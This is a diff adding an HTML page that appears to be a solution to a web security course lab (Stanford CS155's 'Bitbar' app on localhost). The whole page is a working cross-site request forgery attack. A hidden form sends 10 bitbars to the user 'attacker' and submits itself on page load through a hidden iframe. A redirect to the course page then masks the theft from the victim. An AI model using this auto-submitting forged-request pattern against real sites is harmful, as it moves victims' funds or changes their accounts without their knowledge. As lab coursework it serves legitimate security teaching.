@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+  <head>
+    <title></title>
+  </head>
+  <body>
+	<iframe name = "hiddenFrame" sandbox="" hidden></iframe>
+	<form name="transferBitbar" method = "post" action="http://localhost:3000/post_transfer" target = "hiddenFrame" hidden>
+	 <input name="destination_username" value="attacker">
+	 <input name="quantity" value=10>
+	</form>
+	 <script> 
+	 	document.transferBitbar.submit(); 
+	 	setTimeout(function(){
+	 		window.location = "http://crypto.stanford.edu/cs155/"; 
+	 	}, 100);
+	</script>
+  </body>
